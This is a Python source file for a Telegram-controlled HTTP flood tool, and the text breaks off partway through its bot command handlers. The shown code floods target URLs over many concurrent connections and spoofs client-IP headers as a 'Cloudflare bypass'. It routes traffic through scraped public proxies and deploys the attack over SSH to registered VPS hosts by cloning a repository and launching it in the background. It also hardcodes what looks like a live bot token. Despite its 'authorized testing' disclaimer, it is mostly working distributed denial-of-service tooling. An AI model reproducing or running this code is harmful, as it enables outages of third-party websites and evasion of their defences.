#!/usr/bin/env python3
"""
Stresser - Telegram-controlled HTTP stress-testing tool for authorized pentesting.
Features: multi-target attack, VPS auto-deploy, proxy scrape+check, Cloudflare bypass.

Usage:
  python3 stresser.py http://target.com -d 30 -c 2000
  python3 stresser.py --telegram              # Start Telegram bot control
  python3 stresser.py http://target.com --proxy-list proxies.txt --rand-ua

Bot commands:
  /start           - Show help
  /attack <url>    - Start attack (optional: -d 60 -c 500)
  /attack multi    - Multi-target attack
  /stop            - Stop current attack
  /status          - Show running attack status
  /addvps <ip> <user> <pass> - Register VPS
  /vpslist         - List registered VPS
  /vpsstatus       - Check VPS connectivity
  /deploy <url>    - Deploy attack to all VPS
  /scrape          - Scrape fresh proxies
  /proxies         - Show proxy status
  /checkproxy      - Validate saved proxies

DISCLAIMER: For authorized security testing only.
"""
import asyncio
import argparse
import sys
import time
import random
import socket
import ssl as sslmod
import re
import os
import json
import signal
from typing import Dict, List, Tuple, Optional
from urllib.parse import urlparse

# Set spawn start method for multiprocessing
import multiprocessing as mp
try:
    mp.set_start_method('spawn', force=True)
except RuntimeError:
    pass

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------
BOT_TOKEN = "8684782173:AAGPdyYkmK2BtxZfcf1opSbmWryOdI4flmM"
ALLOWED_CHAT_IDS = [8751865150]
VPS_FILE = "/tmp/vps_list.json"
PROXY_FILE = "/tmp/working_proxies.txt"
PROXY_SCRAPE_URLS = [
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=10000&country=all",
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=10000&country=all",
    "https://proxylist.geonode.com/api/proxy-list?limit=100&page=1&sort_by=lastChecked&sort_type=desc",
    "https://www.proxy-list.download/api/v1/get?type=http",
    "https://spys.me/proxy.txt",
]
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Edge/120.0.0.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15",
    "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.0.0",
]

# ===================================================================
# SECTION 1: EXISTING STRESS ENGINE (kept intact)
# ===================================================================

# ---------------------------------------------------------------------------
# Proxy scraper
# ---------------------------------------------------------------------------
async def scrape_proxies(timeout: int = 10) -> List[str]:
    import aiohttp
    proxies: List[str] = []
    seen: set = set()
    async def fetch_one(client: aiohttp.ClientSession, url: str) -> None:
        try:
            async with client.get(url, timeout=aiohttp.ClientTimeout(total=timeout)) as resp:
                if resp.status != 200:
                    return
                text = await resp.text()
                for line in text.strip().split("\n"):
                    line = line.strip()
                    m = re.match(r"(\d+\.\d+\.\d+\.\d+):(\d+)", line)
                    if m:
                        entry = f"{m.group(1)}:{m.group(2)}"
                        if entry not in seen:
                            seen.add(entry)
                            proxies.append(entry)
        except Exception:
            pass
    connector = aiohttp.TCPConnector(limit=10, limit_per_host=5)
    async with aiohttp.ClientSession(connector=connector) as client:
        tasks = [fetch_one(client, url) for url in PROXY_SCRAPE_URLS]
        await asyncio.gather(*tasks, return_exceptions=True)
    return proxies


def load_proxy_file(path: str) -> List[str]:
    proxies = []
    with open(path) as f:
        for line in f:
            line = line.strip()
            if line and re.match(r"\d+\.\d+\.\d+\.\d+:\d+", line):
                proxies.append(line)
    print(f"  [+] Loaded {len(proxies)} proxies from {path}")
    return proxies


# ---------------------------------------------------------------------------
# Request builder
# ---------------------------------------------------------------------------
def build_requests(host: str, port: int, path: str, count: int,
                   cf_bypass: bool, rand_ua: bool) -> bytes:
    reqs = bytearray()
    for _ in range(count):
        ua = random.choice(USER_AGENTS) if rand_ua else USER_AGENTS[0]
        cf_hdrs = ""
        if cf_bypass:
            fip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            cf_hdrs = (
                f"X-Forwarded-For: {fip}\r\n"
                f"X-Real-IP: {fip}\r\n"
                f"CF-Connecting-IP: {fip}\r\n"
                f"X-Originating-IP: {fip}\r\n"
                f"X-Forwarded-Host: {fip}\r\n"
                f"Client-IP: {fip}\r\n"
            )
        req = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {host}:{port}\r\n"
            f"User-Agent: {ua}\r\n"
            f"Accept: text/html,*/*;q=0.8\r\n"
            f"Accept-Language: en-US,en;q=0.9\r\n"
            f"Connection: keep-alive\r\n"
            f"{cf_hdrs}"
            f"\r\n"
        )
        reqs.extend(req.encode())
    return bytes(reqs)


# ---------------------------------------------------------------------------
# Stats
# ---------------------------------------------------------------------------
class StressStats:
    __slots__ = ("completed", "failed", "bytes_recv", "lat_total",
                 "lat_min", "lat_max", "status_codes", "errors")
    def __init__(self):
        self.completed = 0
        self.failed = 0
        self.bytes_recv = 0
        self.lat_total = 0.0
        self.lat_min = float('inf')
        self.lat_max = 0.0
        self.status_codes: Dict[int, int] = {}
        self.errors: Dict[str, int] = {}


# ---------------------------------------------------------------------------
# Async HTTP response reader
# ---------------------------------------------------------------------------
async def read_http_response(reader, timeout):
    buf = b""
    while b"\r\n\r\n" not in buf:
        chunk = await asyncio.wait_for(reader.read(4096), timeout=timeout)
        if not chunk:
            return (0, 0, "EOF before headers")
        buf += chunk
    header_end = buf.index(b"\r\n\r\n") + 4
    headers_raw = buf[:header_end]
    body = buf[header_end:]
    status = 0
    if headers_raw.startswith(b"HTTP/"):
        try:
            parts = headers_raw.split(b" ", 2)
            status = int(parts[1])
        except (ValueError, IndexError):
            pass
    content_len = -1
    is_chunked = False
    for hdr in headers_raw.split(b"\r\n"):
        hl = hdr.lower()
        if hl.startswith(b"content-length:"):
            try:
                content_len = int(hdr.split(b":")[1].strip())
            except (ValueError, IndexError):
                pass
        elif hl.startswith(b"transfer-encoding:"):
            if b"chunked" in hl:
                is_chunked = True
    try:
        if content_len >= 0:
            while len(body) < content_len:
                chunk = await asyncio.wait_for(reader.read(65536), timeout=timeout)
                if not chunk:
                    break
                body += chunk
        elif is_chunked:
            while not body.endswith(b"0\r\n\r\n"):
                chunk = await asyncio.wait_for(reader.read(65536), timeout=timeout)
                if not chunk:
                    break
                body += chunk
    except asyncio.TimeoutError:
        pass
    return (status, len(body), None)


# ---------------------------------------------------------------------------
# Connection worker: persistent TCP connection with keep-alive
# ---------------------------------------------------------------------------
async def connection_worker(
    cid: int, host: str, port: int, path: str,
    deadline: float, timeout: float,
    cf_bypass: bool, rand_ua: bool, is_https: bool,
    proxy_list: List[str], stats: StressStats,
) -> None:
    ssl_ctx = None
    if is_https:
        ssl_ctx = sslmod.create_default_context()
        ssl_ctx.check_hostname = False
        ssl_ctx.verify_mode = sslmod.CERT_NONE
    PIPELINE = 1
    MERGE_EVERY = 500
    ok = fail = recv = 0
    lat_total = 0.0
    lat_min = float('inf')
    lat_max = 0.0
    sc: Dict[int, int] = {}
    errs: Dict[str, int] = {}

    def merge():
        nonlocal ok, fail, recv, lat_total, lat_min, lat_max, sc, errs
        stats.completed += ok
        stats.failed += fail
        stats.bytes_recv += recv
        stats.lat_total += lat_total
        if lat_min < stats.lat_min:
            stats.lat_min = lat_min
        if lat_max > stats.lat_max:
            stats.lat_max = lat_max
        for code, cnt in sc.items():
            stats.status_codes[code] = stats.status_codes.get(code, 0) + cnt
        for e, cnt in errs.items():
            stats.errors[e] = stats.errors.get(e, 0) + cnt
        ok = fail = recv = 0
        lat_total = 0.0
        lat_min = float('inf')
        lat_max = 0.0
        sc = {}
        errs = {}

    target_host, target_port = host, port
    use_ssl = is_https
    if proxy_list:
        entry = random.choice(proxy_list)
        parts = entry.split(":")
        target_host = parts[0]
        target_port = int(parts[1])
        use_ssl = False

    host_header = host if (port == 80 or port == 443) else f"{host}:{port}"
    req_prefix = f"GET {path} HTTP/1.1\r\nHost: {host_header}\r\nUser-Agent: "
    req_suffix = "\r\nAccept: text/html,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.9\r\nConnection: keep-alive"

    reader = None
    writer = None

    try:
        while time.time() < deadline:
            if writer is None:
                try:
                    reader, writer = await asyncio.wait_for(
                        asyncio.open_connection(
                            target_host, target_port,
                            ssl=ssl_ctx if use_ssl else None,
                        ),
                        timeout=timeout,
                    )
                except Exception as e:
                    errs[f"connect:{type(e).__name__}"] = errs.get(f"connect:{type(e).__name__}", 0) + 1
                    fail += 1
                    await asyncio.sleep(0.02)
                    if ok + fail >= MERGE_EVERY:
                        merge()
                    continue

            t0 = time.time()
            ua = random.choice(USER_AGENTS) if rand_ua else USER_AGENTS[0]
            cf_bytes = b""
            if cf_bypass:
                fip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                cf_bytes = f"\r\nX-Forwarded-For: {fip}\r\nX-Real-IP: {fip}\r\nCF-Connecting-IP: {fip}\r\nX-Originating-IP: {fip}\r\nX-Forwarded-Host: {fip}\r\nClient-IP: {fip}".encode()
            single_req = req_prefix.encode() + ua.encode() + req_suffix.encode() + cf_bytes + b"\r\n\r\n"
            pipeline_reqs = single_req * PIPELINE

            try:
                writer.write(pipeline_reqs)
                await writer.drain()

                for _ in range(PIPELINE):
                    status, body_len, err = await read_http_response(reader, timeout)
                    if err:
                        raise ConnectionResetError(err)
                    lat = time.time() - t0
                    ok += 1
                    recv += body_len
                    lat_total += lat
                    if lat < lat_min:
                        lat_min = lat
                    if lat > lat_max:
                        lat_max = lat
                    sc[status] = sc.get(status, 0) + 1
                    if ok + fail >= MERGE_EVERY:
                        merge()

            except Exception as e:
                errs[type(e).__name__] = errs.get(type(e).__name__, 0) + 1
                fail += 1
                try:
                    writer.close()
                    await writer.wait_closed()
                except Exception:
                    pass
                writer = None
                reader = None

    except asyncio.CancelledError:
        pass
    finally:
        if writer is not None:
            try:
                writer.close()
                await writer.wait_closed()
            except Exception:
                pass
        merge()


# ---------------------------------------------------------------------------
# HTTP/2 connection worker (uses httpx for proper HTTP/2 support)
# ---------------------------------------------------------------------------
async def connection_worker_http2(
    cid: int, url: str, deadline: float, timeout: float,
    cf_bypass: bool, rand_ua: bool,
    stats: StressStats,
) -> None:
    """HTTP/2 worker using httpx.AsyncClient. Avoids Cloudflare's raw-TCP detection."""
    import httpx
    limits = httpx.Limits(max_keepalive_connections=1, max_connections=200)
    headers = {
        'Accept': 'text/html,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
    }
    ok = fail = recv = 0
    lat_total = 0.0
    lat_min = float('inf')
    lat_max = 0.0
    sc: Dict[int, int] = {}
    errs: Dict[str, int] = {}
    MERGE_EVERY = 200

    def merge():
        nonlocal ok, fail, recv, lat_total, lat_min, lat_max, sc, errs
        stats.completed += ok
        stats.failed += fail
        stats.bytes_recv += recv
        stats.lat_total += lat_total
        if lat_min < stats.lat_min:
            stats.lat_min = lat_min
        if lat_max > stats.lat_max:
            stats.lat_max = lat_max
        for code, cnt in sc.items():
            stats.status_codes[code] = stats.status_codes.get(code, 0) + cnt
        for e, cnt in errs.items():
            stats.errors[e] = stats.errors.get(e, 0) + cnt
        ok = fail = recv = 0
        lat_total = 0.0
        lat_min = float('inf')
        lat_max = 0.0
        sc = {}
        errs = {}

    client = httpx.AsyncClient(http2=True, limits=limits, headers=headers, timeout=httpx.Timeout(timeout))
    try:
        while time.time() < deadline:
            t0 = time.time()
            try:
                r = await client.get(url)
                lat = time.time() - t0
                sc[r.status_code] = sc.get(r.status_code, 0) + 1
                ok += 1
                recv += len(r.content)
                lat_total += lat
                if lat < lat_min:
                    lat_min = lat
                if lat > lat_max:
                    lat_max = lat
            except Exception as e:
                ename = type(e).__name__
                errs[ename] = errs.get(ename, 0) + 1
                fail += 1
            if ok + fail >= MERGE_EVERY:
                merge()
    except asyncio.CancelledError:
        pass
    finally:
        await client.aclose()
        merge()


async def stress(url: str, duration: int, connections: int, timeout: float,
                 cf_bypass: bool, rand_ua: bool, proxy_list: List[str],
                 http2: bool = False, progress_cb=None) -> dict:
    """Run stress test and return results dict. Optional progress_cb(completed, failed, rps)."""
    parsed = urlparse(url)
    host = parsed.hostname
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    path = parsed.path or "/"
    if parsed.query:
        path += "?" + parsed.query
    is_https = parsed.scheme == "https"
    deadline = time.time() + duration

    stats = StressStats()
    start = time.time()

    if http2:
        workers = [
            connection_worker_http2(i, url, deadline, timeout,
                                    cf_bypass, rand_ua, stats)
            for i in range(connections)
        ]
    else:
        workers = [
            connection_worker(i, host, port, path, deadline, timeout,
                              cf_bypass, rand_ua, is_https, proxy_list, stats)
            for i in range(connections)
        ]
    tasks = [asyncio.create_task(w) for w in workers]

    last_print = 0.0
    try:
        while time.time() < deadline:
            now = time.time()
            if now - last_print >= 0.5:
                total = stats.completed + stats.failed
                e = now - start
                rps = total / e if e > 0 else 0
                if progress_cb:
                    progress_cb(stats.completed, stats.failed, rps)
                last_print = now
            await asyncio.sleep(0.1)
    except asyncio.CancelledError:
        pass

    for t in tasks:
        t.cancel()
    await asyncio.gather(*tasks, return_exceptions=True)

    elapsed = time.time() - start
    total = stats.completed + stats.failed
    rps = total / elapsed if elapsed > 0 else 0

    return {
        'ok': stats.completed,
        'fail': stats.failed,
        'bytes': stats.bytes_recv,
        'lat_total': stats.lat_total,
        'lat_min': stats.lat_min,
        'lat_max': stats.lat_max,
        'sc': dict(stats.status_codes),
        'errors': dict(stats.errors),
        'total': total,
        'rps': rps,
        'elapsed': elapsed,
    }


# ---------------------------------------------------------------------------
# Local test server
# ---------------------------------------------------------------------------
def run_server():
    import asyncio
    async def handle(reader, writer):
        while True:
            buf = b""
            while b"\r\n\r\n" not in buf:
                chunk = await asyncio.wait_for(reader.read(4096), timeout=30)
                if not chunk:
                    return
                buf += chunk
            body = b"ok\r\n"
            resp = (
                b"HTTP/1.1 200 OK\r\n"
                b"Content-Type: text/plain\r\n"
                b"Content-Length: " + str(len(body)).encode() + b"\r\n"
                b"Connection: keep-alive\r\n"
                b"\r\n"
                b"ok\r\n"
            )
            writer.write(resp)
            await writer.drain()
    async def main():
        server = await asyncio.start_server(handle, "0.0.0.0", 8081)
        print("[*] Test server listening on :8081")
        async with server:
            await server.serve_forever()
    asyncio.run(main())


# ===================================================================
# SECTION 2: VPS MANAGER
# ===================================================================

class VPSManager:
    """Manages VPS instances via SSH: add, deploy, check status."""

    def __init__(self, vps_file: str = VPS_FILE):
        self.vps_file = vps_file
        self.servers: List[dict] = []
        self._load()

    def _load(self):
        try:
            if os.path.exists(self.vps_file):
                with open(self.vps_file) as f:
                    data = json.load(f)
                    self.servers = data if isinstance(data, list) else []
        except Exception:
            self.servers = []

    def _save(self):
        try:
            with open(self.vps_file, 'w') as f:
                json.dump(self.servers, f, indent=2)
        except Exception:
            pass

    def add(self, ip: str, username: str, password: str, label: str = "") -> bool:
        """Add a VPS to the list."""
        for s in self.servers:
            if s['ip'] == ip:
                s['username'] = username
                s['password'] = password
                s['label'] = label or ip
                self._save()
                return True
        self.servers.append({
            'ip': ip,
            'username': username,
            'password': password,
            'label': label or ip,
            'added': time.time(),
        })
        self._save()
        return True

    def remove(self, ip: str) -> bool:
        self.servers = [s for s in self.servers if s['ip'] != ip]
        self._save()
        return True

    def list(self) -> List[dict]:
        return list(self.servers)

    async def check_one(self, server: dict) -> dict:
        """SSH into a VPS and check if it's reachable."""
        try:
            import asyncssh
            conn, _ = await asyncio.wait_for(
                asyncio.get_event_loop().create_connection(
                    lambda: asyncssh.SSHClient(),
                    host=server['ip'],
                    port=22,
                ),
                timeout=10,
            )
            # asyncssh connection style
            async with asyncssh.connect(
                server['ip'],
                username=server['username'],
                password=server['password'],
                known_hosts=None,
                connect_timeout=10,
            ) as ssh:
                result = await ssh.run('uptime')
                uptime = result.stdout.strip() if result.stdout else "no output"
                return {'ip': server['ip'], 'online': True, 'uptime': uptime, 'error': None}
        except Exception as e:
            return {'ip': server['ip'], 'online': False, 'uptime': None, 'error': str(e)[:100]}

    async def check_all(self) -> List[dict]:
        """Check all VPS servers concurrently."""
        tasks = [self.check_one(s) for s in self.servers]
        return await asyncio.gather(*tasks, return_exceptions=True)

    async def deploy_and_run(self, server: dict, attack_cmd: str) -> str:
        """
        SSH into VPS, clone repo, install deps, run attack command.
        Returns output log.
        """
        import asyncssh
        output = []
        try:
            async with asyncssh.connect(
                server['ip'],
                username=server['username'],
                password=server['password'],
                known_hosts=None,
                connect_timeout=15,
            ) as ssh:
                # Ensure repo exists
                result = await ssh.run('cd /opt && if [ ! -d kalipto-runtime ]; then git clone https://github.com/Visakha90/kalipto-runtime.git; fi 2>&1')
                output.append(f"clone: {result.stdout.strip()}")
                if result.stderr:
                    output.append(f"clone_err: {result.stderr.strip()}")

                # Install deps
                result = await ssh.run('cd /opt/kalipto-runtime && pip install aiohttp 2>&1 | tail -3')
                output.append(f"deps: {result.stdout.strip()}")

                # Run attack in background using nohup
                esc_cmd = attack_cmd.replace('"', '\\"')
                result = await ssh.run(f'cd /opt/kalipto-runtime && nohup python3 stresser.py {esc_cmd} > /tmp/attack.log 2>&1 & echo "PID=$!"')
                output.append(f"run: {result.stdout.strip()}")
                return "\n".join(output)
        except Exception as e:
            return f"ERROR: {str(e)[:200]}"


# ===================================================================
# SECTION 3: PROXY MANAGER (enhanced with check+save)
# ===================================================================

class ProxyManager:
    """Scrape, validate, and save working proxies."""

    def __init__(self, proxy_file: str = PROXY_FILE):
        self.proxy_file = proxy_file
        self.all_proxies: List[str] = []
        self.working_proxies: List[str] = []
        self._load_saved()

    def _load_saved(self):
        if os.path.exists(self.proxy_file):
            with open(self.proxy_file) as f:
                for line in f:
                    line = line.strip()
                    if line and re.match(r"\d+\.\d+\.\d+\.\d+:\d+", line):
                        self.working_proxies.append(line)
        self.all_proxies = list(self.working_proxies)

    def save_working(self):
        """Save working proxies to file."""
        try:
            with open(self.proxy_file, 'w') as f:
                for p in self.working_proxies:
                    f.write(p + "\n")
            return len(self.working_proxies)
        except Exception:
            return 0

    async def scrape(self, timeout: int = 10) -> int:
        """Scrape proxies from public APIs."""
        proxies = await scrape_proxies(timeout)
        self.all_proxies = list(set(self.all_proxies + proxies))
        return len(self.all_proxies)

    async def check_one(self, proxy: str, test_url: str = "http://httpbin.org/ip", check_timeout: int = 5) -> bool:
        """Test a single proxy by making a request through it."""
        import aiohttp
        try:
            connector = aiohttp.TCPConnector(limit=1)
            async with aiohttp.ClientSession(connector=connector) as session:
                async with session.get(
                    test_url,
                    proxy=f"http://{proxy}",
                    timeout=aiohttp.ClientTimeout(total=check_timeout),
                ) as resp:
                    return resp.status == 200
        except Exception:
            return False

    async def check_all(self, max_workers: int = 50, test_url: str = "http://httpbin.org/ip") -> tuple:
        """Test all scraped proxies and keep only working ones."""
        import aiohttp
        sem = asyncio.Semaphore(max_workers)
        working = []
        failed = 0

        async def test(p):
            async with sem:
                if await self.check_one(p, test_url):
                    working.append(p)
                else:
                    nonlocal failed
                    failed += 1

        tasks = [test(p) for p in self.all_proxies]
        await asyncio.gather(*tasks, return_exceptions=True)

        self.working_proxies = working
        saved = self.save_working()
        return len(working), failed, saved

    def get_working(self) -> List[str]:
        return list(self.working_proxies)

    def stats(self) -> str:
        return f"Total: {len(self.all_proxies)}, Working: {len(self.working_proxies)}, Saved to: {self.proxy_file}"


# ===================================================================
# SECTION 4: TELEGRAM BOT
# ===================================================================

class TelegramBot:
    """Telegram bot controller for remote stress testing."""

    def __init__(self, token: str, allowed_chat_ids: List[int]):
        self.token = token
        self.allowed_chat_ids = set(allowed_chat_ids)
        self.base_url = f"https://api.telegram.org/bot{token}"
        self.offset = 0
        self.running_attack = False
        self.attack_task: Optional[asyncio.Task] = None
        self.attack_start = 0.0
        self.current_target = ""
        self.current_args = {}

        # Sub-managers
        self.vps = VPSManager()
        self.proxy_mgr = ProxyManager()

    # ---------- Telegram API helpers ----------

    async def _api_request(self, method: str, data: dict = None) -> dict:
        import aiohttp
        import traceback
        url = f"{self.base_url}/{method}"
        try:
            async with aiohttp.ClientSession() as session:
                if data:
                    async with session.post(url, json=data, timeout=aiohttp.ClientTimeout(total=15)) as resp:
                        return await resp.json()
                else:
                    async with session.get(url, timeout=aiohttp.ClientTimeout(total=15)) as resp:
                        return await resp.json()
        except Exception as e:
            print(f"[Bot] API {method} error: {e}")
            traceback.print_exc()
            return {"ok": False}

    async def send(self, chat_id: int, text: str, parse_mode: str = "HTML") -> None:
        """Send a message to a specific chat."""
        # Split long messages
        if len(text) > 4000:
            for i in range(0, len(text), 4000):
                chunk = text[i:i + 4000]
                await self._api_request("sendMessage", {
                    "chat_id": chat_id,
                    "text": chunk,
                    "parse_mode": parse_mode,
                })
        else:
            await self._api_request("sendMessage", {
                "chat_id": chat_id,
                "text": text,
                "parse_mode": parse_mode,
            })

    async def broadcast(self, text: str) -> None:
        """Send message to all authorized users."""
        for cid in self.allowed_chat_ids:
            await self.send(cid, text)

    async def get_updates(self):
        """Long-poll for new updates."""
        params = {"offset": self.offset, "timeout": 30}
        import aiohttp
        async with aiohttp.ClientSession() as session:
            try:
                async with session.get(
                    f"{self.base_url}/getUpdates",
                    params=params,
                    timeout=aiohttp.ClientTimeout(total=35),
                ) as resp:
                    data = await resp.json()
                    if data.get("ok"):
                        for update in data.get("result", []):
                            self.offset = update["update_id"] + 1
                            yield update
            except Exception:
                pass

    # ---------- Attack runner ----------

    async def run_attack(self, chat_id: int, url: str, duration: int = 30,
                         connections: int = 200, timeout: float = 8,
                         cf_bypass: bool = False, rand_ua: bool = False,
                         http2: bool = False) -> None:
        """Run a stress test and report progress/results to Telegram."""
        self.running_attack = True
        self.current_target = url
        self.attack_start = time.time()

        await self.send(chat_id,
            f"🔥 <b>Attack Started</b>\n"
            f"Target: {url}\n"
            f"Duration: {duration}s | Connections: {connections}\n"
            f"CF Bypass: {'yes' if cf_bypass else 'no'} | Rand UA: {'yes' if rand_ua else 'no'}"
            f"HTTP/2: {'yes' if http2 else 'no'}"
        )

        proxy_list = self.proxy_mgr.get_working()

        def progress_cb(ok, fail, rps):
            pass  # We'll send periodic updates from the main loop

        try:
            result = await stress(url, duration, connections, timeout,
                                  cf_bypass, rand_ua, proxy_list,
                                  http2=http2, progress_cb=progress_cb)
            self.running_attack = False
            elapsed = result['elapsed']
            total = result['total']
            rps = result['rps']
            ok = result['ok']
            fail = result['fail']
            sc = result.get('sc', {})
            errs = result.get('errors', {})
            bytes_recv = result.get('bytes', 0)

            msg = (
                f"✅ <b>Attack Complete</b>\n"
                f"Target: {url}\n"
                f"Duration: {elapsed:.1f}s\n"
                f"Total: {total:,} | RPS: {rps:,.1f}\n"
                f"OK: {ok:,} | Fail: {fail:,}\n"
            )
            if bytes_recv:
                msg += f"Throughput: {bytes_recv/1024/1024:.1f} MB/s\n"
            if sc:
                msg += f"Codes: {dict(sorted(sc.items()))}\n"
            if errs:
                msg += f"Errors: {dict(sorted(errs.items()))}\n"
            await self.send(chat_id, msg)

        except asyncio.CancelledError:
            self.running_attack = False
            await self.send(chat_id, f"⛔ <b>Attack Stopped</b>\nTarget: {url}")
        except Exception as e:
            self.running_attack = False
            await self.send(chat_id, f"❌ <b>Attack Error</b>\n{str(e)[:200]}")

    # ---------- Command handlers ----------

    async def handle_command(self, update: dict) -> None:
        msg = update.get("message", {})
        chat_id = msg.get("chat", {}).get("id")
        if chat_id is None:
            return
        if chat_id not in self.allowed_chat_ids:
            await self.send(chat_id, "⛔ Unauthorized. You are not in the allowed chat list.")
            return

        text = msg.get("text", "").strip()
        if not text.startswith("/"):
            return

        parts = text.split()
        cmd = parts[0].lower()
        args = parts[1:]

        handlers = {
            "/start": self._cmd_start,
            "/help": self._cmd_start,
            "/attack": self._cmd_attack,
            "/stop": self._cmd_stop,
            "/status": self._cmd_status,
            "/addvps": self._cmd_addvps,
            "/delvps": self._cmd_delvps,
            "/vpslist": self._cmd_vpslist,
            "/vpsstatus": self._cmd_vpsstatus,
            "/deploy": self._cmd_deploy,
            "/scrape": self._cmd_scrape,
            "/proxies": self._cmd_proxies,
            "/checkproxy": self._cmd_checkproxy,
        }

        handler = handlers.get(cmd)
        if handler:
            await handler(chat_id, args)
        else:
            await self.send(chat_id, f"Unknown command: {cmd}\nUse /start for help.")

    async def _cmd_start(self, chat_id: int, args: List[str]) -> None:
        await self.send(chat_id,
            "🤖 <b>Stresser Bot</b>\n\n"
            "<b>Attack Commands:</b>\n"
            "/attack <code>url</code> [-d 30] [-c 200] [--cf-bypass] [--rand-ua]\n"
            "/attack multi <code>url1</code> <code>url2</code> ... — multi-target\n"
            "/stop — stop running attack\n"
            "/status — current attack status\n\n"
            "<b>VPS Commands:</b>\n"
            "/addvps <code>ip</code> <code>user</code> <code>pass</code> — register VPS\n"
            "/delvps <code>ip</code> — remove VPS\n"
            "/vpslist — list registered VPS\n"
            "/vpsstatus — check all VPS connectivity\n"
            "/deploy <code>attack_args</code> — deploy attack to all VPS\n\n"
            "<b>Proxy Commands:</b>\n"
            "/scrape — scrape proxies from APIs\n"
            "/checkproxy — validate saved proxies\n"
            "/proxies — show proxy stats"
        )

    async def _cmd_attack(self, chat_id: int, args: List[str]) -> None:
        if self.running_attack:
            await self.send(chat_id, "⚠️ Attack already running. Use /stop first.")
            return

        if not args:
            await self.send(chat_id, "Usage: /attack <url> [-d 30] [-c 200] [--cf-bypass] [--rand-ua]\n"
                                     "Or: /attack multi <url1> <url2> ...")
            return

        # Multi-target mode
        if args[0] == "multi" and len(args) >= 2:
            targets = args[1:]
            await self.send(chat_id, f"🎯 <b>Multi-Target Attack</b>\n{len(targets)} targets\n"
                                     f"Starting simultaneous attacks...")
            # Run attacks sequentially for now (single machine)
            for i, tgt in enumerate(targets):
                await self.send(chat_id, f"[{i+1}/{len(targets)}] Attacking: {tgt}")
                self.attack_task = asyncio.create_task(
                    self.run_attack(chat_id, tgt, 30, 200, 8, False, False, False)
                )
                await self.attack_task
            await self.send(chat_id, "✅ Multi-target attack sequence complete.")
            return

        # Single target with options
        url = args[0]
        duration = 30
        connections = 200
        timeout_val = 8
        cf_bypass = False
        rand_ua = False
        http2 = False

        i = 1
        while i < len(args):
            if args[i] == "-d" and i + 1 < len(args):
                try:
                    duration = int(args[i + 1])
                    i += 1
                except ValueError:
                    pass
            elif args[i] == "-c" and i + 1 < len(args):
                try:
                    connections = int(args[i + 1])
                    i += 1
                except ValueError:
                    pass
            elif args[i] == "-t" and i + 1 < len(args):
                try:
                    timeout_val = float(args[i + 1])
                    i += 1
                except ValueError:
                    pass
            elif args[i] == "--cf-bypass":
                cf_bypass = True
            elif args[i] == "--rand-ua":
                rand_ua = True
            elif args[i] == "--http2":
                http2 = True
            i += 1

        self.attack_task = asyncio.create_task(
            self.run_attack(chat_id, url, duration, connections, timeout_val,
                            cf_bypass, rand_ua, http2=http2)
        )

    async def _cmd_stop(self, chat_id: int, args: List[str]) -> None:
        if self.attack_task and not self.attack_task.done():
            self.attack_task.cancel()
            await self.send(chat_id, "⛔ Attack stopping...")
        else:
            await self.send(chat_id, "No attack is running.")

    async def _cmd_status(self, chat_id: int, args: List[str]) -> None:
        if self.running_attack:
            elapsed = time.time() - self.attack_start
            await self.send(chat_id,
                f"⚡ <b>Attack Running</b>\n"
                f"Target: {self.current_target}\n"
                f"Elapsed: {elapsed:.0f}s"
            )
        else:
            await self.send(chat_id, "No attack running.")

    async def _cmd_addvps(self, chat_id: int, args: List[str]) -> None:
        if len(args) < 3:
            await self.send(chat_id, "Usage: /addvps <ip> <user> <password> [label]")
            return
        ip = args[0]
        user = args[1]
        pwd = args[2]
        label = args[3] if len(args) > 3 else ""
        self.vps.add(ip, user, pwd, label)
        await self.send(chat_id, f"✅ VPS added: {ip} ({user})")

    async def _cmd_delvps(self, chat_id: int, args: List[str]) -> None:
        if not args:
            await self.send(chat_id, "Usage: /delvps <ip>")
            return
        self.vps.remove(args[0])
        await self.send(chat_id, f"🗑️ VPS removed: {args[0]}")

    async def _cmd_vpslist(self, chat_id: int, args: List[str]) -> None:
        servers = self.vps.list()
        if not servers:
            await self.send(chat_id, "📭 No VPS registered. Use /addvps to add one.")
            return
        lines = [f"📋 <b>Registered VPS ({len(servers)})</b>"]
        for i, s in enumerate(servers, 1):
            lines.append(f"{i}. <code>{s['ip']}</code> — {s.get('username', '?')} [{s.get('label', s['ip'])}]")
        await self.send(chat_id, "\n".join(lines))

    async def _cmd_vpsstatus(self, chat_id: int, args: List[str]) -> None:
        servers = self.vps.list()
        if not servers:
            await self.send(chat_id, "📭 No VPS registered.")
            return
        await self.send(chat_id, "🔍 Checking VPS connectivity...")
        results = await self.vps.check_all()
        lines = ["📊 <b>VPS Status</b>"]
        for r in results:
            if isinstance(r, dict):
                status = "✅ Online" if r.get('online') else "❌ Offline"
                ip = r.get('ip', '?')
                uptime = r.get('uptime', '')
                err = r.get('error', '')
                lines.append(f"{status} <code>{ip}</code>")
                if uptime and r.get('online'):
                    lines.append(f"  Uptime: {uptime[:80]}")
                if err:
                    lines.append(f"  Error: {err[:80]}")
            elif isinstance(r, Exception):
                lines.append(f"❌ Error: {str(r)[:80]}")
